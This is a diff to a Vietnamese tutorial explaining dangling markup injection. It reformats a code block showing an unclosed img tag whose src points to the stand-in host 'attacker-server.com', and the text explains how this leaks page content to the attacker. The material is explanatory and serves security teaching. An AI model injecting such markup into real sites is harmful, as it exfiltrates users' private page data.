@@ -32,7 +32,9 @@
 
   - Cụ thể, *Dangling markup* là khi attacker chèn 1 thẻ html vào DOM mà không đóng các attribute của thẻ đó lại, để nó 'treo lủng lẳng' như sau:
 
-    ```html <img src='attacker-server.com/```  
+    ```html 
+    <img src='attacker-server.com/
+    ```  
 
     Khi trình duyệt render phản hồi, nó sẽ duyệt các ký tự tiếp theo của thẻ trên, đến khi gặp dấu single quote (```'```) tiếp theo thì dừng lại, các ký tự vừa được duyệt sẽ trở thành một phần của đường dẫn cho thuộc tính ```src```. Khi giao diện được render, request từ ```src``` được gửi tới server của attacker, họ sẽ đọc được 1 phần nội dung của trang web mà đáng ra họ không thể thấy.
 
